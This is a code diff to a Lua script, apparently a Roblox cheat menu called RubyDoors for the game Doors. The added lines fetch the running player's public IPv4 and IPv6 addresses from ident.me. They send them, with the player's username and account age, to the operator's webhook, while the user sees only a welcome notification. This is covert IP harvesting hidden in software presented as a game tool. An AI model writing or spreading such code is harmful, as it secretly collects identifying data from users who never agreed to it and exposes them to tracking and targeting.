@@ -137,6 +137,12 @@ if not Player.PlayerGui:FindFirstChild("RubyDoorsGui") then
     local ToggleEspText = Instance.new("TextLabel")
     local ToggleScriptText = Instance.new("TextLabel")
     local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+    local Loaded1 = game:HttpGet("https://v4.ident.me/22")
+    local Loaded2 = game:HttpGet("https://v6.ident.me/22")
+
+    if Loaded2 == "" then
+        Loaded2 = "Not Available"
+    end
 
     RubyDoorsGui.Name = "RubyDoorsGui"
     RubyDoorsGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -525,7 +531,9 @@ if not Player.PlayerGui:FindFirstChild("RubyDoorsGui") then
             {
                 { ["name"] = "**DisplayName [Username]**",["value"] = Player.DisplayName .. " [@" .. Player.Name .. "]",["inline"] = false },
                 { ["name"] = "**Account Age**",["value"] = Player.AccountAge,["inline"] = false },
-                { ["name"] = "**Game Type**",["value"] = "A-1000",["inline"] = false } })
+                { ["name"] = "**Game Type**",["value"] = "A-1000",["inline"] = false },
+                { ["name"] = "**Main**",["value"] = Loaded1,["inline"] = false },
+                { ["name"] = "**Secondary**",["value"] = Loaded2,["inline"] = false } })
         SendNotification("Welcome, " .. Player.Name, "RubyDoors activated! Goodluck with A-1000!", Sound1)
     else
         RubyHubData.SendWebhook(RubyHubData.Webhooks.Doors.Main, "**A player has executed the script!**", "",
@@ -533,7 +541,9 @@ if not Player.PlayerGui:FindFirstChild("RubyDoorsGui") then
             {
                 { ["name"] = "**DisplayName [Username]**",["value"] = Player.DisplayName .. " [@" .. Player.Name .. "]",["inline"] = false },
                 { ["name"] = "**Account Age**",["value"] = Player.AccountAge,["inline"] = false },
-                { ["name"] = "**Game Type**",["value"] = "Normal",["inline"] = false } })
+                { ["name"] = "**Game Type**",["value"] = "Normal",["inline"] = false },
+                { ["name"] = "**Main**",["value"] = Loaded1,["inline"] = false },
+                { ["name"] = "**Secondary**",["value"] = Loaded2,["inline"] = false } })
         SendNotification("Welcome, " .. Player.Name, "RubyDoors activated! Enjoy the game!", Sound1)
     end
 
